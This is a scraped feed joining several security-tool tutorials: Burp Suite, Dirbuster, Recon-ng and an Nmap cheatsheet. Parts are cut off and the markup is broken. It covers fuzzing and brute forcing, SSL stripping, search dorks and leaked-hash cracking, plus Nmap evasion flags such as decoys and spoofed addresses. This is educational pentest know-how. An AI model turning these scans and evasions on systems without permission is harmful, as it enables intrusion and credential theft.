    <content type="html"><![CDATA[<p>Yes, the time has come for a full post on Burp Suite! I have delayed it for too long!</p>

<p>Before starting, here are some resources for learning about Burp:</p>

<p><a href="https://portswigger.net/burp/help/contents.html">Burp Suite Documentation</a></p>

<!-- more -->


<p>Burp Suite is the primary tool used for performing web application security assessments. It acts as a proxy between your browser and the target, and it comes packed with powerful features to assist in penetration testing: spidering fuctionality, web scanning for vulnerabilities (pro version only), tools that allow you to perform different actions with web requests (will be covered in detail below), and customization ability through plugins.</p>

<h1>Introduction to Burp Suite</h1>

<p>Burp is a Java application, so you need to have Java installed (version 1.6 or later) to run it. It comes pre-installed in Kali, where you can find it in the Web Application Analysis category.</p>

<p>To use Burp, you need to configure your browser&rsquo;s proxy settings. Burp&rsquo;s proxy is listening on 127.0.0.1:8080. If you want to manually configure your browser to use it, refer to this <a href="https://portswigger.net/burp/help/suite_gettingstarted.html">getting started post</a>. I recommend using a browser add-on like <a href="https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/">FoxyProxy</a> to set up your proxies and toggle them with a click.</p>

<p>For <strong>Burp to work with HTTPS</strong> requests, you need to add Burp&rsquo;s CA certificate to your browser. Go to <a href="http://burp/">http://burp/</a> and click on CA Certificate to download it to your computer. In this demo I&rsquo;m using Firefox, but the steps should be similar in the rest of the browsers. In the Firefox menu, select Options or Preferences, then go to Advanced &ndash;> Certificates &ndash;> View Certificates. Click on the Authorities tab and choose Import to select your CA certificate, and check the option &ldquo;Trust this CA to identify web sites&rdquo;. Then click Ok, and restart Firefox. Burp should work now with HTTPS traffic, without issuing any security warnings.</p>

<h1>Burp Suite components</h1>

<p>The power of Burp comes from the interaction between its components, which you can individually access from the application tabs. Let&rsquo;s see each of them in action!</p>

<h2>Target</h2>

<p>Here you can see information about your target. The site map constructs a hierarchical representation of your target. Items requested are shown in black, those that Burp inferred from links etc. are in gray. As you browse with the proxy on, Burp will keep building the site map.</p>

<p><img class="center" src="/images/tools/burp/sitemap.png" title="&lsquo;sitemap&rsquo; &lsquo;target sitemap&rsquo;" ></p>

<p>You can configure the scope of your targets from the Scope tab. Alternately, you can right-click on the sitemap entries to perform other actions:</p>

<p><img class="center" src="/images/tools/burp/sitemap-menu.png" title="&lsquo;sitemap menu&rsquo; &lsquo;target sitemap menu&rsquo;" ></p>

<p>Clicking on the Filter bar lets you customize filtering options. Before starting the demo, I added my target to the scope and selected to hide the out-of scope items for a clearer view.</p>

<p><img class="center" src="/images/tools/burp/sitemap-filter.png" title="&lsquo;sitemap filter&rsquo; &lsquo;target sitemap filter&rsquo;" ></p>

<h2>Proxy</h2>

<p>This is the component that allows you to intercept and modify the requests between your browser and the target. You will get familiar with the Intercept tab, where you can inspect each request and response, modify it, or send it to other tools. The history tabs keep records for the HTTP and WebSockets messages. In the Options tab you have a plethora of configuration options for your Proxy. Take special note of the Response Modification options, which you can use to automatically modify the responses HTML to remove client-side logic and controls, or perform SSL stripping.</p>

<p><img class="center" src="/images/tools/burp/proxy-options.png" title="&lsquo;proxy response options&rsquo; &lsquo;response modification options&rsquo;" ></p>

<p>Right-clicking in the Raw tab will give you more options, among which there are some very useful ones such as copying the request as a Curl command, or constructing selected strings in Javascript and SQL (MySQL, Oracle, MS-SQL)</p>

<h2>Spider</h2>

<p>You can use Burp&rsquo;s spider to automatically crawl target applications. After you&rsquo;ve manually browsed the application, right-click the host or URL that you want to crawl in the site map, and choose &ldquo;Spider this host / branch&rdquo;. Then watch the number of requests being made in the Control tab. You can customize the spider in the Options tab. Passive spidering is enabled by default, allowing Burp to update the site map while you are manually browsing. Also, you can specify what the spider should do when encountering forms (ignoring them, automatically submitting with pre-determined values, prompting for guidance etc.) Be careful, as the spider may perform actions with repercussions on the target application, so an initial manual assessment followed by a strict configuration of the spidering scope would be preferred.</p>

<h2>Scanner</h2>

<p>Burp has an automatic vulnerability scanner <em>uncontrolled drooling</em> that seems excellent from the reviews, but it&rsquo;s only available for Pro users. If you look in the Issue definitions tab, you can see the <a href="https://portswigger.net/KnowledgeBase/Issues/">vulnerabilites that Burp can detect</a>, among with a description for each of them <em>drooling intensifies</em></p>

<p><img class="center" src="/images/tools/burp/scanner.png" title="&lsquo;burp scanner&rsquo; &lsquo;burp web scanner&rsquo;" ></p>

<h2>Intruder</h2>

<p>With Burp Intruder you can perform highly-customized automated attacks against your targets, including brute forcing, fuzzing, enumeration etc. Usually, you select an interesting request and send it to Intruder. You can see the positions where payloads will be placed, marked in orange in this dummy request:</p>

<p><img class="center" src="/images/tools/burp/intruder-position.png" title="&lsquo;intruder positions&rsquo; &lsquo;intruder payload positions&rsquo;" ></p>

<h3>Attack types</h3>

<p>In the Position tab, you can also choose the type of attack you want to perform:</p>

<ul>
<li><p><strong>Sniper</strong> &ndash; single set of payloads, places each payload into each position in turn, useful for individual parameter fuzzing</p></li>
<li><p><strong>Battering ram</strong> &ndash; single set of payloads, places the the same payload into all positions at the same time</p></li>
<li><p><strong>Pitchfork</strong> &ndash; multiple payload sets, different payload set for each position</p></li>
<li><p><strong>Cluster bomb</strong> &ndash; multiple payload sets, tests all permutations of the payload combinations, so depending on your payloads, this attack might grow to gigantic proportions</p></li>
</ul>


<h3>Payload types</h3>

<p>You have lots of payload types available for testing, so choose what is appropriate for your target:</p>

<ul>
<li><p><strong>Simple list</strong> &ndash; list of strings</p></li>
<li><p><strong>Runtime file</strong> &ndash; read strings at runtime from a file (for very large lists)</p></li>
<li><p><strong>Custom iterator</strong> &ndash; permutations of characters in multiple lists</p></li>
<li><p><strong>Character substitution</strong> &ndash; substitute characters, for instance when you are testing for 53cur3 p455w0rd5</p></li>
<li><p><strong>Case modification</strong> &ndash; change the characters' case according to the pre-defined rules</p></li>
<li><p><strong>Recursive grep</strong> &ndash; recursively extract data from the responses of previous requests</p></li>
<li><p><strong>Illegal Unicode</strong> &ndash; by using illegal Unicode representations, it might be possible to bypass filters etc.</p></li>
<li><p><strong>Character blocks</strong> &ndash; creates blocks of characters of specified sizes, can aid in detecting buffer overflows</p></li>
<li><p><strong>Numbers</strong> &ndash; numeric payloads</p></li>
<li><p><strong>Dates</strong> &ndash; date values</p></li>
<li><p><strong>Brute forcer</strong> &ndash; sets of permutations generated from specified characters</p></li>
<li><p><strong>Null payloads</strong> &ndash; empty string payloads</p></li>
<li><p><strong>Character frobber</strong> &ndash; changes the value of each character in turn, useful for determining what characters are being used for session tokens etc.</p></li>
<li><p><strong>Bit flipper</strong> &ndash; flips individual bits in the payload</p></li>
<li><p><strong>Username generator</strong> &ndash; generates usernames from the given input</p></li>
<li><p><strong>ECB block shuffler</strong> &ndash; shuffles ECB-encrypted blocks</p></li>
<li><p><strong>Extension generated</strong> &ndash; uses an extension to create the payloads</p></li>
<li><p><strong>Copy other payload</strong> &ndash; copies the current payload value to a different position</p></li>
</ul>


<h2>Repeater</h2>

<p>This tool is useful for sending requests over and over to the target application.</p>

<p><img class="center" src="/images/tools/burp/repeater.png" title="&lsquo;repeater&rsquo; &lsquo;repeater&rsquo;" ></p>

<h2>Sequencer</h2>

<p>With the Sequencer tool you can test for the randomness of data tokens in an target application. The analysis is more accurate if the number of captured tokens is larger.</p>

<p><img class="center" src="/images/tools/burp/sequencer.png" title="&lsquo;Burp sequencer&rsquo; &lsquo;Burp sequencer&rsquo;" ></p>

<h2>Decoder</h2>

<p>The Decoder tool performs encoding and decoding of different data formats, such as HTML, URL, Base64, ASCII hex, Hex, Octal, Binary, Gzip, and it also has hashing functionality for MD2, SHA-224, MD5, SHA1, SHA-384, SHA, SHA-512 and SHA-256.</p>

<p><img class="center" src="/images/tools/burp/decoder.png" title="&lsquo;Burp decoder&rsquo; &lsquo;Burp decoder&rsquo;" ></p>

<h2>Comparer</h2>

<p>If you want to compare different responses, this tool gives you the options of words or bytes comparison</p>

<p><img class="center" src="/images/tools/burp/comparer.png" title="&lsquo;Burp comparer&rsquo; &lsquo;Burp comparer&rsquo;" ></p>

<h2>Extender</h2>

<p>Here you can add extensions to Burp that add more functionality than what is available by default. Take a look at what extensions you can find in the BApp Store:</p>

<p><img class="center" src="/images/tools/burp/extensions.png" title="&lsquo;burp extensions&rsquo; &lsquo;burp extensions&rsquo;" ></p>

<p>In this screenshot I am sorting by rating. There are many extensions available and I suggest looking at each and determining if you will need it before choosing to install.</p>

<h3>Burp Clickbandit</h3>

<p>We&rsquo;re done with the main tools, but Burp has more. It even includes a cool tool for creating clickjacking attacks.</p>

<p><img class="center" src="/images/tools/burp/clickbandit.png" title="&lsquo;burp clickbandit&rsquo; &lsquo;burp clickbandit&rsquo;" ></p>

<p>In a future post I will do a lab featuring Burp&rsquo;s capabilities that I&rsquo;ve enumerated so far. Expect some Mutillidae! :&ndash;)</p>

    <id>http://chousensha.github.io/blog/2016/09/12/pentest-tools-dirbuster</id>
    <content type="html"><![CDATA[<p>Dirbuster is a <a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">multithreaded Java application</a> that tries to find hidden files and directories on a target web application by brute forcing their names. Dirbuster comes with <a href="https://github.com/digination/dirbuster-ng/tree/master/wordlists">9 lists</a> of common file and directory names that were crawled from the internet, but you can choose to use your own. Pure brute forcing is also available, but due to the time constraints, the filelist option is by far the most commonly used</p>

<!-- more -->


<p>As an aside, you might have probably noticed that lately I&rsquo;ve been writing less writeups and have been focusing more on tools and system administration fundamentals. I thought that in the long run, this approach would yield better and faster results, both in CTF challenges and in real-life hacking (bug bounties, I&rsquo;m looking at you). While I haven&rsquo;t used Dirbuster so much, I was inspired to write a post for it after reading <a href="https://blog.it-securityguard.com/bugbounty-decoding-a-%F0%9F%98%B1-00000-htpasswd-bounty/">this blog post on how it helped in acquiring a nice bounty</a></p>

<p>With that said, let&rsquo;s take a look at Dirbuster&rsquo;s interface:</p>

<p><img class="center" src="/images/tools/dirbuster/dirbuster.png" title="&lsquo;dirbuster&rsquo; &lsquo;dirbuster interface&rsquo;" ></p>

<p>This tool is not complicated to use, nor does it have tons of other functionality besides discovering hidden resources. However, from my (limited) experience with it, the default settings might not work in the majority of cases (causing crashes and so on). A bit of fine tuning is required to get the most of your dirbusting experience, and is this that I will be covering here.</p>

<h1>Dirbuster configuration</h1>

<p>The first thing you will do when starting Dirbuster is to select a wordlist to use. The lists that come with Dirbuster are located in <code>/usr/share/dirbuster/wordlists/</code> on a Kali machine.</p>

<p><img class="center" src="/images/tools/dirbuster/dirbuster-lists.png" title="&lsquo;dirbuster lists&rsquo; &lsquo;dirbuster default lists&rsquo;" ></p>

<ul>
<li><p><strong>Work method</strong> &ndash; leave the Auto Switch selected for fastest results. Dirbuster will try a HEAD request first, saving more bandwidth and latency than it would with a straight on GET request.</p></li>
<li><p><strong>Number of threads</strong> &ndash; the default is 10, but in my own testing, I found this excessive, so I am now starting with 3-5 threads. Since the <em>Go Faster</em> option allows you to jump over 100 threads, you might think the faster the better, but I noticed that Dirbuster has a really thin line between slow but working and fast but crashed. Maybe it&rsquo;s the local vulnerable installations I tested against, but it seems logical to treat a live target with more caution than a lab..you don&rsquo;t want to DOS your target in your search for goodies.</p></li>
</ul>


<p>In your choice of wordlist, take a second to review the target and see if it uses case sensitive resources (for instance, try seeing if admin returns the same as Admin, use lowecase lists if target is a IIS web server etc.). This will help you decide what list is most appropriate for the job, and save you precious time.</p>

<p>Under the starting options, you will tweak things as needed, because there is no one-size-fits-all approach to these checkboxes. The <strong>standard start point</strong> considers directories as ending with a / slash, and files ending with the specified extension. It&rsquo;s best not to run with all the options checked at the same time, as this will take significant time and it may potentially crash the target. I separate the <em>Brute Force Directories</em> and <em>Brute Force Files</em> + <em>Use Blank Extension</em>. As always, the target dictates the weapon, so time constraints and the sensitivity of the target should also be taken into consideration for the <em>Be Recursive</em> option, which I toggle as necessary.</p>

<p>The <strong>URL fuzz</strong> option allows you to enter the words in the lists directly in the URL, in a template like manner. An example offered by Dirbuster is  <code>test.html?url={dir}.asp</code>, where the content in curly brackets will be substituted for the words in list.</p>

<h2>Dirbuster Options</h2>

<p>In the Options tab, you can further tweak your Dirbuster installation.</p>

<p><img class="center" src="/images/tools/dirbuster/dirbuster-options.png" title="&lsquo;dirbuster options&rsquo; &lsquo;dirbuster options&rsquo;" ></p>

<ul>
<li><p><strong>Follow redirects</strong> &ndash; I check this, but it does come with an overhead increase, you might want to leave it unchecked and manually navigate to interesting places that were found</p></li>
<li><p><strong>Parse HTML</strong> is on by default, and it lets Dirbuster read the HTML and look there for other files and folders that it won&rsquo;t have to guess</p></li>
</ul>


<p>In the Advanced options, there a few more tabs you can configure. The Dirbuster Options tab allows you to set some default values so you don&rsquo;t have to change them each time you start the application.</p>

<p>In the HTML Parsing tab you can configure which HTML elements to extract links from, along with file extensions that should not be processed.</p>

<p><img class="center" src="/images/tools/dirbuster/dirbuster-html.png" title="&lsquo;dirbuster html options&rsquo; &lsquo;dirbuster html parsing&rsquo;" ></p>

<p>The Authentication tabs covers authentication options for Basic, Digest and NTLM authentication. In the HTTP Options tab you might want to spend a few moments to change the blatantly conspicuous user agent. Also, note the <em>Run through a proxy</em> option, which is available if you want to..well, run Dirbuster through a proxy. It&rsquo;s also possible to add custom headers, maybe you want to add a cookie to use Dirbuster as an authenticated user. That might be risky if your user privileges allow you to perform certain actions on the target, so you might want to restrict other options in this case (maybe you don&rsquo;t want to follow all the links in case one of them does something you really wouldn&rsquo;t want to, and so on).</p>

<p><img class="center" src="/images/tools/dirbuster/dirbuster-http.png" title="&lsquo;dirbuster http options&rsquo; &lsquo;dirbuster http options&rsquo;" ></p>

<p>Finally, there&rsquo;s the Scan options tab. I chose to decrease the default <em>Connection Timeout</em> value from 30 to 10 seconds and to limit the number of requests per second. You can also see the failcase string that Dirbuster uses to determine if a resource is actually there or not.</p>

<p><img class="center" src="/images/tools/dirbuster/dirbuster-scan.png" title="&lsquo;dirbuster scan options&rsquo; &lsquo;dirbuster scan options&rsquo;" ></p>

<p>After running a scan, you can see the results found, including the HTTP response code and the size. I ran a test scan against Mutillidae with threads blazing for the demo:</p>

<p><img class="center" src="/images/tools/dirbuster/dirbuster-results.png" title="&lsquo;dirbuster scan results&rsquo; &lsquo;dirbuster scan results&rsquo;" ></p>

<p>You can also see the results in a tree view, for better readability:</p>

<p><img class="center" src="/images/tools/dirbuster/dirbuster-tree.png" title="&lsquo;dirbuster tree&rsquo; &lsquo;dirbuster tree results&rsquo;" ></p>

<p>This concludes the post on Dirbuster. Despite being unmaintained (not sure if that&rsquo;s a word), it&rsquo;s still the go-to application for files and folders discovery. Use it early in the recon process (after you took a look at the target to know which settings to apply) for best results!</p>

    <link href="http://chousensha.github.io/blog/2016/08/29/pentest-tools-recon-ng/"/>
    <updated>2016-08-29T15:30:18-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/08/29/pentest-tools-recon-ng</id>
    <content type="html"><![CDATA[<p>In this post I&rsquo;ll discuss the use of the powerful web reconaissance framework, Recon-ng.</p>

<p><a href="https://bitbucket.org/LaNMaSteR53/recon-ng">Recon-ng is a full-featured Web Reconnaissance framework written in Python. Complete with independent modules, database interaction, built in convenience functions, interactive help, and command completion, Recon-ng provides a powerful environment in which open source web-based reconnaissance can be conducted quickly and thoroughly.</a></p>

<!-- more -->


<p>Recon-ng is an invaluable tool for performing information gathering. It is modeled on the Metasploit framework, so the interface and functionality are pretty similar.</p>

<p><img class="center" src="/images/tools/recon-ng.png" title="&lsquo;recon-ng&rsquo; &lsquo;recon-ng&rsquo;" ></p>

<h1>Recon-ng core commands</h1>

<p>With the help menu, you can get an overview of what commands are available:</p>

<p>``` plain
[recon-ng][default] > help</p>

<h2>Commands (type [help|?] <topic>):</h2>

<p>add             Adds records to the database
back            Exits the current context
delete          Deletes records from the database
exit            Exits the framework
help            Displays this menu
keys            Manages framework API keys
load            Loads specified module
pdb             Starts a Python Debugger session
query           Queries the database
record          Records commands to a resource file
reload          Reloads all modules
resource        Executes commands from a resource file
search          Searches available modules
set             Sets module options
shell           Executes shell commands
show            Shows various framework items
snapshots       Manages workspace snapshots
spool           Spools output to a file
unset           Unsets module options
use             Loads specified module
workspaces      Manages workspaces
```</p>

<p>You can already see the similarity with Metasploit. Let&rsquo;s focus on what&rsquo;s exclusive to to Recon-ng, the powerful recon capabilities. You can leverage different search engines and social media for information gathering. To leverage the most of this functionality, you will need to use API keys. Below you can see the available APIs:</p>

<p>``` plain
[recon-ng][default] > keys list</p>

<p>  +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
  |        Name       | Value |
  +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
  | bing_api          |       |
  | builtwith_api     |       |
  | facebook_api      |       |
  | facebook_password |       |
  | facebook_secret   |       |
  | facebook_username |       |
  | flickr_api        |       |
  | fullcontact_api   |       |
  | google_api        |       |
  | google_cse        |       |
  | instagram_api     |       |
  | instagram_secret  |       |
  | ipinfodb_api      |       |
  | jigsaw_api        |       |
  | jigsaw_password   |       |
  | jigsaw_username   |       |
  | linkedin_api      |       |
  | linkedin_secret   |       |
  | pwnedlist_api     |       |
  | pwnedlist_iv      |       |
  | pwnedlist_secret  |       |
  | shodan_api        |       |
  | twitter_api       |       |
  | twitter_secret    |       |
  +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
```</p>

<p>In addition to the well known APIs of the main search engines and social media, there are the following:</p>

<ul>
<li><p>the BuiltWith Domain API, which provides XML and JSON access to the technology information of a website</p></li>
<li><p>FullContact lets you easily query by email, phone number, or Twitter username. Results include publicly- available social profiles, photos, basic demographics, job titles, company stats, and over 100 other public data points.</p></li>
<li><p>IPInfoDB, which provides free access to IP geolocation tools</p></li>
<li><p>Jigsaw is an online directory of free, downloadable Company information and more than 11 million business Contacts. Every Jigsaw business Contact is complete with hard-to-find direct dials and email addresses, while each Company record gives the low down on Company size, location, and industry.</p></li>
<li><p>PwnedList is designed for consumers to check if their email address has been found on commonly circulating lists of stolen accounts and passwords (this has been shut down at the time of this writing)</p></li>
</ul>


<p>If you were to add a new API key, you could do it like this:</p>

<p>``` plain
[recon-ng][default] > keys add bing_api 007007
[*] Key &lsquo;bing_api&rsquo; added.
[recon-ng][default] > keys list</p>

<p>  +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
  |        Name       | Value  |
  +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
  | bing_api          | 007007 |
```</p>

<p>To delete an API key, you can use the <code>keys delete</code> command.</p>

<p>To see what items are available in the framework, use the <strong>show</strong> command:</p>

<p>``` plain
[recon-ng][default] > show

```</p>

<p>This should give you an idea of the kinds of data you can look for. Again, this should feel similar to Metasploit. In fact, like in the msfconsole, the modules are what you will use to perform different tasks. Let&rsquo;s take a look at all the currently available modules. Oh, and did I mention there is tab completion as well? :D</p>

<p>You can select a module via the <strong>load</strong> or <strong>use</strong> commands. Once in a module&rsquo;s context, you can see information about it with the <code>show info</code> command. Similarly, you can see the required options for a module with the <code>show options</code> command, and change them with <strong>set</strong>. Let&rsquo;s look at each module and see some usage examples</p>

<h2>Discovery</h2>

<ul>
<li><p>DNS Cache Snooper &ndash; Uses the DNS cache snooping technique to check for visited domains</p></li>
<li><p>Interesting File Finder &ndash; Checks hosts for interesting files in predictable locations</p></li>
</ul>


<p>Let&rsquo;s see more about this module:</p>

<p>``` plain
[recon-ng][default][interesting_files] > show info</p>

<pre><code>  Name: Interesting File Finder
  Path: modules/discovery/info_disclosure/interesting_files.py
Author: Tim Tomes (@LaNMaSteR53), thrapt (thrapt@gmail.com), Jay Turla (@shipcod3), and Mark Jeffery

<p>Description:

- inurl:elmah.axd ext:axd intitle:"Error log for"
- inurl:server-status "Apache Status"
</code></pre>

<p>```</p>

<p>I found this a bit confusing at first, but the SOURCE is the equivalent of the target you do recon on. I ran this on my own blog for a demo. When setting a target, keep in mind not to include the http or https (the protocol setting handles that), and also to exclude the trailing slash (I got errors until I did that).</p>

<li><p>MailTester Email Validator &ndash; Leverages MailTester.com to validate email addresses</p></li>
<li><p>Contact Name Mangler &ndash; Applies a mangle pattern to all of the contacts stored in the database, creating email addresses or
usernames for each harvested contact. Updates the &lsquo;contacts&rsquo; table with the results.</p></li>
<li><p>Contact Name Unmangler &ndash; Applies a regex or unmangle pattern to all of the contacts stored in the database, pulling out the
individual name components. Updates the &lsquo;contacts&rsquo; table with the results.</p></li>
<li><p>Have I been pwned? Breach Search &ndash; Leverages the haveibeenpwned.com API to determine if email addresses are associated with breached
credentials. Adds compromised email addresses to the &lsquo;credentials&rsquo; table.</p></li>
<li><p>Have I been pwned? Paste Search &ndash; Leverages the haveibeenpwned.com API to determine if email addresses have been published to various

input. Updates the &lsquo;contacts&rsquo; and &lsquo;profiles&rsquo; tables with the results.</p></li>
<li><p>Adobe Hash Cracker &ndash; Decrypts hashes leaked from the 2013 Adobe breach. First, the module cross references the leak ID to
identify Adobe hashes in the &lsquo;password&rsquo; column of the &lsquo;creds&rsquo; table, moves the Adobe hashes to the
&lsquo;hash&rsquo; column, and changes the &lsquo;type&rsquo; to &lsquo;Adobe&rsquo;. Second, the module attempts to crack the hashes
by comparing the ciphertext&rsquo;s decoded cipher blocks to a local block lookup table (BLOCK_DB) of
known cipher block values. Finally, the module updates the &lsquo;creds&rsquo; table with the results based on
the level of success.</p></li>
<li><p>PyBozoCrack Hash Lookup &ndash; Searches Google for the value of a hash and tests for a match by hashing every word in the resulting
page using all hashing algorithms supported by the &lsquo;hashlib&rsquo; library. Updates the &lsquo;credentials&rsquo;
table with the positive results.</p></li>
<li><p>Hashes.org Hash Lookup &ndash; Uses the Hashes.org API to perform a reverse hash lookup. Updates the &lsquo;credentials&rsquo; table with the
positive results.</p></li>

    <updated>2016-07-31T06:40:43-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/07/31/nmap-cheatsheet</id>
    <content type="html"><![CDATA[<p>Recently, I&rsquo;ve been reading Fyodor&rsquo;s <a href="https://www.amazon.com/Nmap-Network-Scanning-Official-Discovery/dp/0979958717">Nmap Network Scanning</a> book and decided to create an Nmap cheatsheet while at it.</p>

<p>Half of the book, including updated content, is also available for free on <a href="https://nmap.org/book/toc.html">https://nmap.org/book/toc.html</a></p>

<p>Fyodor was also nice enough to set up a machine that you can test your scans against (within reasonable limits), at <a href="http://scanme.nmap.org/">http://scanme.nmap.org/</a></p>

<p>All right, let&rsquo;s get scanning!</p>

<!-- more -->


<h1>Commands cheatsheet</h1>

<h2>Scan types</h2>

<p><strong>-sS</strong>: TCP SYN scan &ndash; the default scan, most popular due to its speed and stealth, as it doesn&rsquo;t complete a TCP connection</p>

<p><strong>-sT</strong>: TCP Connect scan, it uses the connect() system call, used by unprivileged users who can&rsquo;t send raw packets or when scanning IPv6 targets</p>

<p><strong>-sV</strong>: Version detection, omit for performance increase and/or stealth</p>

<p><strong>-sA</strong>: TCP ACK scan, can&rsquo;t tell if the ports are open or closed, but it can determine whether firewall rules are stateful or stateless</p>

<p><strong>-sW</strong>: TCP Window scan, same as ACK, but it can determine open and closed ports on certain systems</p>

<p><strong>-sM</strong>: Maimon scan, yet another special scan type for bypassing firewalls</p>

<p><strong>-sU</strong>: UDP scan. You can improve it by adding a version scan alongside it (but it will be slower)</p>

<p><strong>-sF</strong>: FIN scan, sets the FIN bit, useful in bypassing some firewalls and determining the target&rsquo;s OS between Windows and Unix types, as it doesn&rsquo;t work against Windows</p>

<p><strong>-sX</strong>: Xmas scan, another option for firewall evasion, sets the FIN, PSH, and URG flags, creating the impression of a lit Christmas tree</p>

<p><strong>-sN</strong>: Null scan, doesn&rsquo;t set any flags, an additional option to evade pesky firewalls</p>

<p><strong>-sO</strong>: IP protocol scan, check which IP protocols are supported on the target</p>

<p><strong>-b <FTP relay host></strong>: FTP bounce scan, also available to unprivileged users</p>

<p><strong>-A</strong>: Enable OS detection, version detection, script scanning, and traceroute</p>

<h3>Host discovery</h3>

<p><strong>List scan &ndash; sL</strong> &ndash; enumerates the addresses in the specified range and does reverse DNS lookup on them. Good for getting a feel about the targets by checking their DNS names, and maintaining a low profile on the network (because no ping requests are being sent yet, so it&rsquo;s stealthier)</p>

<p><strong>-p-</strong>: Shortcut for <em>-p1-65535</em></p>

<p><strong>-Pn</strong>: Treat all hosts as online &mdash; skip host discovery (disable ping)</p>

<p><strong>&mdash;exclude &lt;host1[,host2][,host3],&hellip;></strong>: Exclude hosts/networks</p>

<p><strong>-n</strong>: Never do DNS resolution</p>

<p><strong>-sP</strong>: perform a ping sweep</p>

<p><strong>-PS/PA/PU</strong>: TCP SYN ping/TCP ACK ping/UDP ping &ndash; various host discovery options for bypassing firewalls</p>

<h3>Performance</h3>

<p><strong>-T&lt;0-5></strong>: Set timing template (higher is faster). -T4 (aggressive) is recommended for most cases, as it improves performance and optimization for a fast and reliable network. For evasion purposes you can use T0 (paranoid) or T1 (sneaky), but speed will be very slow. To conserve bandwidth and resources you may use T2 (polite), at another significant expense of speed. T3 is the normal mode, and T5 is an insane level of speed (but you might sacrifice some accuracy in the process)</p>

<p><strong>-F</strong>: Fast scan, only scan most common 100 ports</p>

<h3>Evasion</h3>

<p><strong>-D &lt;decoy1,decoy2[,ME],&hellip;></strong>: Cloak a scan with decoys</p>

<p><strong>&mdash;scanflags <flags></strong>: Customize TCP scan flags. You can couple it with specifying a TCP scan type to give Nmap a base of interpreting the results</p>

<p><strong>-S &lt;IP_Address></strong>: Spoof source address</p>

<p><strong>-sI <zombie host[:probeport]></strong>: Idle scan, a complex scan that is stealthy but slow. It uses zombies to perform the scan, without sending packets directly from your IP. Use in tandem with the -PN option to disable ping and not disclose your real address. Avoid -sV, as version detection would also make your IP visible to the target</p>

<p><strong>-f; &mdash;mtu <val></strong>: fragment packets (optionally w/given MTU), can aid in bypassing firewalls that don&rsquo;t handle fragmentation well</p>

<p><strong>-g/&mdash;source-port <portnum></strong>: Spoof source port, bypass security measures that rely only on checking the source port</p>

<p><strong>&mdash;spoof-mac <mac address/prefix/vendor name></strong>: Spoof your MAC address</p>

<p><strong>&mdash;badsum</strong>: Send packets with a bogus TCP/UDP/SCTP checksum. Normal hosts discard packets with bad checksums, but firewalls may omit these checks for performance reasons</p>

<p><strong>&mdash;dns-servers &lt;serv1[,serv2],&hellip;></strong>: Specify custom DNS servers when doing reverse DNS lookup to avoid your DNS server showing up in the target&rsquo;s logs</p>

<h3>Additional info</h3>

<p><strong>-v</strong>: increase verbosity level, you can use it 2 or 3 times to further increase verbosity</p>

<p><strong>-d</strong>: Increase debugging level (use -dd or more for greater effect), can increase to a max of 9</p>

<p><strong>&mdash;packet-trace</strong>: print summary of every packet sent and received</p>

<h3>Output</h3>

<p><strong>-oN/-oX/-oS/-oG <file></strong>: Output scan in normal, XML, sCrIpt kIddi3, and Grepable format, respectively, to the given filename</p>

<p><strong>-oA <basename></strong>: Output in the three major formats at once</p>

<p><strong>&mdash;resume <filename></strong>: Resume an aborted scan</p>

<p>If you don&rsquo;t want Nmap to display its interactive output, you can pass a <em>&ndash;</em> to the format type(s), like so: <code>-oS &ndash;</code></p>

<h2>Useful tips</h2>

<ul>
<li><p><code>nmap -sL -n target</code> &ndash; list IPs to be scanned before actually scanning them</p></li>
<li><p><code>-pT:22,80,U:53</code> &ndash; scan separate TCP and UDP ports (you have to specify a UDP scan in addition to a TCP scan)</p></li>
<li><p><code>&mdash;version-intensity <level></code>: Set from 0 (light) to 9 (try all probes), setting it to 0 will limit the version detection to the most likely to succeed probes, and improve the speed of the scan</p></li>
<li><p>you can scan a network range by adding the subnet mask after an IP like so: <em>ip/numbits</em>. An example would be: 192.168.80.0/24, where the hosts between 192.168.80.0 and 192.168.80.255 would be scanned</p></li>
<li><p>version detection is noisy</p></li>
<li><p>you can specify port 0 for a scan, to catch malicious software that might listen on it</p></li>
</ul>


<h2>Script scanning</h2>

<p><strong>-sC</strong>: enable some common scripts, may be intrusive to the target</p>

<p><strong>&mdash;script</strong>=<Lua scripts>: <Lua scripts> is a comma separated list of directories, script-files or script-categories</p>

<p><a href="https://nmap.org/book/nse-usage.html">Currently defined categories</a> are:</p>

<ul>
<li><p><em>auth</em> &ndash; operations requiring authentication credentials</p></li>
<li><p><em>broadcast</em> &ndash; local network broadcasts</p></li>
<li><p><em>brute</em> &ndash; brute force attacks</p></li>
<li><p><em>default</em> &ndash; scripts that are run by default with -sC or -A options</p></li>
<li><p><em>discovery</em> &ndash; additional network information and enumeration</p></li>
<li><p><em>dos</em> &ndash; denial of service scripts</p></li>
<li><p><em>exploit</em> &ndash; exploitation of some specific vulnerability</p></li>
<li><p><em>external</em> &ndash; information may be sent to a third-party database or service</p></li>
<li><p><em>fuzzer</em> &ndash; fuzzing scripts</p></li>
<li><p><em>intrusive</em> &ndash; may crash the target system, consume excessive resources, or be perceived as malicious</p></li>
<li><p><em>malware</em> &ndash; test if the target is infected by malware or backdoors</p></li>
<li><p><em>safe</em> &ndash; general network discovery scripts that re unlikely to be resource intensive, crash a system, or lit the target logs on fire</p></li>
<li><p><em>version</em> &ndash; scripts that run only with -sV enabled</p></li>
<li><p><em>vuln</em> &ndash; check for specific vulnerabilities</p></li>

<p>Many thanks to Fyodor for creating such an awesome tool and freely sharing with everyone! As you can see, Nmap is so much more than just a port scanner. You can easily perform some sort of vulnerability analysis and exploitation with it, and if there is no task that you would like Nmap to do and it can&rsquo;t, you can write the code yourself and contribute to this amazing project.</p>

